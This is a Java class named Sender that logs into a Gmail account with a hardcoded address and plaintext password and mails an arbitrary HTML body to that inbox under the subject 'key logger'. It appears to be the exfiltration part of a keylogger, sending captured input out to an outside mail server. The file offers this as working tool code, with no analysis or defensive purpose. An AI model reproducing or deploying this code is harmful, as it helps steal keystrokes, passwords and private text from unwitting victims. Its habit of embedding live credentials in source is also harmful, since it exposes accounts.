package org.nick.handlers;

import java.util.Date;
import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 * 
 * @author NICK
 *
 */
public class Sender {

	private Sender() {};
	
	private static final String SENDER_MAIL = "javaxmailtester@gmail.com";
	private static final String SENDERS_PASSWORD = "javaxmailtester12";
	private static final String RECIEVERS_EMAIL = "javaxmailtester@gmail.com";
	
	private static Properties mailServerProperties;

	
	public static void sendMail(String emailBody) throws Throwable {
		
		/* set the mail server properties*/
		mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.host", "smtp.gmail.com");
		mailServerProperties.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");
		mailServerProperties.put("mail.smtp.socketFactory.fallback","false");
		mailServerProperties.put("mail.smtp.port", "465");//smtps port, SSL encryption is started automatically before any SMTP level communication.
		/*mailServerProperties.put("mail.smtp.port", "587");*/
		//Port 587 is for msa, the default smtp port is 465
		//see https://stackoverflow.com/questions/15796530/what-is-the-difference-between-ports-465-and-587
		mailServerProperties.put("mail.smtp.socketFactory.port",465);//send email via SSL connection
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.store.protocol","pop3");
		mailServerProperties.put("mail.transport.protocol","smtp");
		mailServerProperties.put("mail.smtp.starttls.enable","true");
		
		
		
		//set the password authenticator object of javax.mail
	     PasswordAuthentication pa = new PasswordAuthentication(SENDER_MAIL,SENDERS_PASSWORD);
	     try{
	     Session session = Session.getDefaultInstance(mailServerProperties, 
	                          new Authenticator(){
	                             protected PasswordAuthentication getPasswordAuthentication() {
	                                return pa;
	                             }});

	   // -- Create a new message --
	     Message msg = new MimeMessage(session);
	     
	     
	     // -- Set the FROM and TO fields --
	     msg.setFrom(new InternetAddress(SENDER_MAIL)); // from whom the email is sent	
	     msg.setRecipients(Message.RecipientType.TO, 
	                      InternetAddress.parse(RECIEVERS_EMAIL,false)); // to whom the email will be sent
	     msg.setSubject("key logger"); //subject of email
	     msg.setContent(emailBody, "text/html");
	     msg.setSentDate(new Date()); //date of the email
	     Transport.send(msg);//send the email
	     System.out.println("Message sent.");
	     
	     }catch (MessagingException e){ System.out.println("Error, message was not send correctly" + e);}
	     
	     
	     }
	
}

